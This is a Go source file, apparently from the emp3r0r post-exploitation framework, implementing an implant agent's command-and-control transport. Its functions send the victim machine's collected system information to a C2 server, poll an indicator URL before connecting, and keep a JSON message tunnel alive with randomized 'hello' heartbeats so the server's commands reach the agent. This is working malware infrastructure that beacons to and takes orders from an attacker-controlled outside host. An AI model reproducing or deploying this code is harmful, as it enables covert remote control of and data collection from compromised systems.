package c2transport

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CheckIn poll CC server and report its system info
func CheckIn(info *def.Emp3r0rAgent) (err error) {
	checkin_URL := def.CCAddress + transport.CheckInAPI + "/" + uuid.NewString()
	log.Printf("Collected system info, now checking in (%s)", checkin_URL)

	conn, _, _, err := ConnectCC(checkin_URL)
	if err != nil {
		return err
	}
	defer conn.Close()
	out := json.NewEncoder(conn)
	err = out.Encode(info)
	if err == nil {
		log.Println("Checked in")
	}
	return err
}

// ConditionalC2Yes check common.RuntimeConfig.CCIndicator for conditional C2 connetion
func ConditionalC2Yes(proxy string) bool {
	log.Printf("Checking CCIndicator: %s", common.RuntimeConfig.CCIndicatorURL)
	t := &http.Transport{
		Dial: (&net.Dialer{
			Timeout:   60 * time.Second,
			KeepAlive: 30 * time.Second,
		}).Dial,
		TLSHandshakeTimeout: 60 * time.Second,
	}
	if proxy != "" && strings.HasPrefix(def.Transport, "HTTP2") {
		proxyUrl, err := url.Parse(proxy)
		if err != nil {
			log.Fatalf("invalid proxy: %v", err)
		}
		t.Proxy = http.ProxyURL(proxyUrl)
		log.Printf("IsCCOnline: using proxy %s", proxy)
	}
	client := http.Client{
		Transport: t,
		Timeout:   30 * time.Second,
	}
	resp, err := client.Get(common.RuntimeConfig.CCIndicatorURL)
	if err != nil {
		log.Printf("IsCCOnline: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
		return false
	}
	_, err = io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("IsCCOnline: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
		return false
	}
	defer resp.Body.Close()

	return true
}

func catchInterruptAndExit(cancel context.CancelFunc) {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	<-sig
	log.Println("Cancelling due to interrupt")
	cancel()
	os.Exit(0)
}

// HandShakes record each hello message and C2's reply
var (
	HandShakes      = make(map[string]bool)
	HandShakesMutex = &sync.RWMutex{}
)

// CCMsgTun use the connection (CCConn)
func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) (err error) {
	var (
		in  = json.NewDecoder(def.CCMsgConn)
		out = json.NewEncoder(def.CCMsgConn)
		msg def.MsgTunData // data being exchanged in the tunnel
	)
	go catchInterruptAndExit(cancel)
	defer func() {
		err = def.CCMsgConn.Close()
		if err != nil {
			log.Print("CCMsgTun closing: ", err)
		}

		cancel()
		def.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
		log.Print("CCMsgTun closed")
	}()

	// check for CC server's response
	go func() {
		log.Println("Check CC response: started")
		defer cancel()
		for ctx.Err() == nil {
			// read response
			err = in.Decode(&msg)
			if err != nil {
				log.Print("Check CC response: JSON msg decode: ", err)
				break
			}
			resp := msg.Response
			if strings.HasPrefix(resp, "hello") {
				log.Printf("Hello (%s) received", resp)
				// mark the hello as success
				for hello := range HandShakes {
					if msg.CmdID == hello {
						log.Printf("Hello (%s) acknowledged", resp)
						HandShakesMutex.Lock()
						HandShakes[hello] = true
						HandShakesMutex.Unlock()
						break
					}
				}
				continue
			}

			// process CC data
			go callback(&msg)
		}
		log.Println("Check CC response: exited")
	}()

	wait_hello := func(hello_id string) bool {
		// delete key, forget about this hello when we are done
		defer func() {
			HandShakesMutex.Lock()
			delete(HandShakes, hello_id)
			HandShakesMutex.Unlock()
		}()
		// wait until timeout or success
		for range common.RuntimeConfig.CCTimeout {
			// if hello marked as success, return true
			HandShakesMutex.RLock()
			isSuccess := HandShakes[hello_id]
			HandShakesMutex.RUnlock()
			if isSuccess {
				log.Printf("Hello (%s) done", hello_id)
				return true
			}
			time.Sleep(time.Millisecond)
		}
		log.Printf("Hello (%s) timeout", hello_id)
		return false
	}

	sendHello := func(cnt int) bool {
		var hello_msg def.MsgTunData
		// try cnt times then exit
		for cnt > 0 {
			cnt-- // consume cnt

			// send hello
			hello_msg.CmdSlice = []string{"hello" + util.RandStr(util.RandInt(1, 100))}
			hello_msg.CmdID = uuid.NewString()
			hello_msg.Tag = common.RuntimeConfig.AgentTag
			err = out.Encode(hello_msg)
			if err != nil {
				log.Printf("agent cannot connect to cc: %v", err)
				util.TakeABlink()
				continue
			}
			HandShakesMutex.Lock()
			HandShakes[hello_msg.CmdID] = false
			HandShakesMutex.Unlock()
			log.Printf("Hello (%v) sent", hello_msg.CmdSlice)
			if !wait_hello(hello_msg.CmdID) {
				cancel()
				break
			}
			return true
		}
		return false
	}

	// keep connected
	for ctx.Err() == nil {
		log.Println("Hearbeat begins")
		if !sendHello(util.RandInt(1, 10)) {
			log.Print("sendHello failed")
			break
		}
		if err != nil {
			log.Printf("Updating agent sysinfo: %v", err)
		}
		log.Println("Hearbeat ends")
		util.TakeASnap()
	}

	return fmt.Errorf("CCMsgTun closed: %v", ctx.Err())
}
